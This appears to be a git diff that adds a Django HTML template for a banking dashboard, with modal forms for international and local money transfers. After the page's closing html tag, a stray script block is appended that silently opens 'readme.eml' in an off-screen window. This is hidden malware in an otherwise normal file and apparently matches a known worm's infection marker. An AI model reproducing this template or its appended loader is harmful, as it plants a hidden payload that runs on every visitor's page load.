@@ -1,0 +1,241 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Dashboard</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.1/dist/css/bootstrap.min.css" integrity="sha384-zCbKRCUGaJDkqS1kPbPd7TveP5iyJE0EjAuZQTgFLD2ylzuqKfdKlfG/eSrtxUkn" crossorigin="anonymous">
+  <!--  css-->
+    <link id="pagestyle" href="{% static 'css/material-dashboard.css' %}" rel="stylesheet" />
+    <link rel="stylesheet" href="{% static 'css/dashboardstyle.css' %}">
+</head>
+<body>
+  <nav class="Container navbar navbar-expand-lg pb-2 pb-lg-0 navbar-light bg-white">
+    <img src="{% static 'images/logo.svg' %}" width="10%">
+    <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <span class="navbar-toggler-icon"></span>
+    </button>
+  
+    <div class="collapse navbar-collapse pb-0  justify-content-between" id="navbarSupportedContent">
+      <ul class="navbar-nav mt-3">
+        <li class="nav-item active">
+            <a class="nav-link text-dark Activity" href="{% url 'core:dashboard' %}">Dashboard <span class="sr-only">(current)</span></a>
+        </li>
+
+        <li class="nav-item">
+                <!-- <a class="nav-link text-muted" href="#">Expenses</a> -->
+            </li>
+        </ul>
+
+        <ul class="navbar-nav navbar-nav-scroll align-items-lg-center">
+          <a class="nav-link text-danger" href="{% url 'core:logout' %}" id="dropdownId" aria-expanded="false"> Logout</a>
+
+        <li class="nav-item dropdown">
+               
+         
+      </li>
+
+
+        <!-- <li class="nav-item pt-1 question-mark">
+            <a class="nav-link pt-0" href="#"><i class="fa fa-question-circle fa-2x text-info" aria-hidden="true"></i></a>
+        </li> -->
+        <!-- <li class="nav-item pt-1">
+          <a class="nav-link pt-0" href="profile.html">Profile</a>
+        </li> -->
+        <!-- <li class="nav-item pt-1">
+          <a class="nav-link pt-0" href="payment.html">Payment</a>
+        </li> -->
+        </ul>
+    </div>
+  </nav><hr>
+    
+      <section class="Container">
+            <h3>Make Transfer...</h3> <center>
+              {% for message in messages %}
+              <p style="color: red">{{message}}</p>
+              {% endfor %}
+          </center>
+
+         <div class="d-flex gap-3">
+
+            <div>
+                <!-- Button trigger modal -->
+                <button type="button" class="btn text-white bg_amount_in_dollars" data-toggle="modal" data-target="#modelId">
+                  International transfer
+                </button>
+                
+                <!-- Modal -->
+                <div class="modal fade" id="modelId" tabindex="-1" role="dialog" aria-labelledby="modelTitleId" aria-hidden="true">
+                    <div class="modal-dialog" role="document">
+                        <div class="modal-content">
+                            <div class="modal-header">
+                                <h5 class="modal-title">Payment details</h5>
+                                    <button type="button" class="close" data-dismiss="modal" aria-label="Close">
+                                        <span aria-hidden="true">&times;</span>
+                                    </button>
+                            </div>
+                            <div class="modal-body">
+                                <form action="{% url 'core:international' %}" class="px-4" method="POST">
+                                    {% csrf_token %}
+                                     <div class="form-row row mb-3">
+                                       <div class="col-md-6">
+                                         <label for="to_fullname">Full name</label>
+                                         <input name="to_fullname" type="text" class="form-control border border-1 bg-white" placeholder="John Doe">
+                                       </div>
+                                       <div class="col-md-6">
+                                         <label for="lastname">Bank name</label>
+                                         <input name="bank_name" type="text" class="form-control border border-1 bg-white" placeholder="Bank name">
+                                       </div>
+                                     </div>
+                           
+                                     <div class="form-row row mb-3">
+                                       <div class="col-md-6">
+                                         <label for="inputEmail4">Account Number</label>
+                                         <input name="to_account" type="text" class="form-control border border-1 bg-white" placeholder="1234567890">
+                                       </div>
+                                       <div class="col-md-6">
+                                         <label for="inputEmail4">Amount </label>
+                                         <input name="transfer_amount" type="number" class="form-control border border-1 bg-white" placeholder="12345">
+                                       </div>
+                                     </div>
+                           
+                                     <div class="form-row row mb-3">
+                                       <div class="col-md-6">
+                                         <label for="text">IBAN number</label>
+                                         <input name="iban_number" type="text" class="form-control border border-1 bg-white" placeholder="12345">
+                                       </div>
+                                       <div class="col-md-6">
+                                         <label for="text">Routing number </label>
+                                         <input name="routing_number" type="text" class="form-control border border-1 bg-white" placeholder="12345">
+                                       </div>
+                                     </div>
+
+                                     <div class="form-row row mb-3">
+                                     <div class="col-md-6">
+                                         <label for="text">Country </label>
+                                         <input name="bank_country" type="text" class="form-control border border-1 bg-white" placeholder="Country">
+                                       </div>
+                                       <div class="col-md-6">
+                                         <label for="text">Currency type </label>
+                                         <input name="currency_type" type="text" class="form-control border border-1 bg-white" placeholder="USD">
+                                       </div>
+                                     </div>
+
+                                     <div class="form-row row mb-3">
+                                      <div class="col-md-6">
+                                        <label for="inputEmail4">Description</label>
+                                        <input name="transfer_description" type="text" class="form-control border border-1 bg-white" placeholder="Transfer description">
+                                      </div>
+                                      <div class="col-md-6">
+                                        <label for="tel"> Transaction Pin </label>
+                                        <input name="transaction_pin" type="password" class="form-control border border-1 bg-white" placeholder="0000">
+                                      </div>
+                                    </div>
+                                    <button type="submit" class="btn bg_amount_in_dollars text-white">Send</button>
+                                   </form>
+                            </div>
+                            <!-- <div class="modal-footer">
+                                <button type="button" class="btn shadow-none btn-danger" data-dismiss="modal">Close</button>
+                                <a href="{% url 'core:success' %}"><button type="submit" class="btn bg_amount_in_dollars text-white">Pay</button></a>
+                            </div> -->
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+         <div>
+          <button type="button" class="btn bg_amount_in_dollars text-white" data-toggle="modal" data-target="#myModal">
+            Local Transfer
+          </button>
+        
+          <!-- The Modal -->
+          <div class="modal" id="myModal">
+            <div class="modal-dialog">
+              <div class="modal-content">
+              
+                <!-- Modal Header -->
+                <div class="modal-header">
+                  <h5 class="modal-title">Payment details</h5>
+                  <button type="button" class="close" data-dismiss="modal">&times;</button>
+                </div>
+                
+                <!-- Modal body -->
+                <div class="modal-body">
+                  <form action="{% url 'core:local' %}"  class="px-4" method="POST">
+                    {% csrf_token %}
+                    <div class="form-row row mb-3">
+                      <div class="col-md-6">
+                        <label for="firstname">Full name</label>
+                        <input name="to_fullname" type="text" class="form-control border border-1 bg-white" placeholder="John Doe">
+                      </div>
+                      <div class="col-md-6">
+                        <label for="lastname">Bank name</label>
+                        <input name="bank_name" type="text" class="form-control border border-1 bg-white" placeholder="Bank name">
+                      </div>
+                    </div>
+          
+                    <div class="form-row row mb-3">
+                      <div class="col-md-6">
+                        <label for="inputEmail4">Account Number</label>
+                        <input name="to_account" type="text" class="form-control border border-1 bg-white" placeholder="1234567890">
+                      </div>
+                      <div class="col-md-6">
+                        <label for="inputEmail4">Amount </label>
+                        <input name="transfer_amount" type="number" class="form-control border border-1 bg-white" placeholder="1234">
+                      </div>
+                    </div>
+          
+                    <div class="form-row row mb-3">
+                      <div class="col-md-6">
+                        <label for="inputEmail4">Description</label>
+                        <input name="transfer_description" type="text" class="form-control border border-1 bg-white" placeholder="Transfer description">
+                      </div>
+                      <div class="col-md-6">
+                        <label for="tel"> Transaction Pin </label>
+                        <input name="transaction_pin" type="password" class="form-control border border-1 bg-white" placeholder="0000">
+                      </div>
+                    </div>
+                    <button type="submit" class="btn bg_amount_in_dollars text-white">Send</button>
+                  </form>
+                </div>
+                
+                <!-- Modal footer -->
+                <!-- <div class="modal-footer">
+                  <button type="button" class="btn btn-danger" data-dismiss="modal">Close</button>
+                  <a href="{% url 'core:success' %}"><button type="submit" class="btn bg_amount_in_dollars text-white">Pay</button></a>
+                </div> -->
+                
+              </div>
+            </div>
+          </div>
+         </div>
+           
+         </div>
+
+       
+        
+
+        </section>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+      <script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.slim.min.js" integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj" crossorigin="anonymous"></script>
+      <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.1/dist/umd/popper.min.js" integrity="sha384-9/reFTGAW83EW2RDu2S0VKaIzap3H66lZH81PoYlFhbGU+6BZp6G7niu735Sk7lN" crossorigin="anonymous"></script>
+      <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.1/dist/js/bootstrap.min.js" integrity="sha384-VHvPCCyXqtD5DqJeNxl2dtTyhF78xXNXdkwX1CZeRusQfRKp+tA7hAShOK/B/fQ2" crossorigin="anonymous"></script>
+</body>
+</html>
+<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
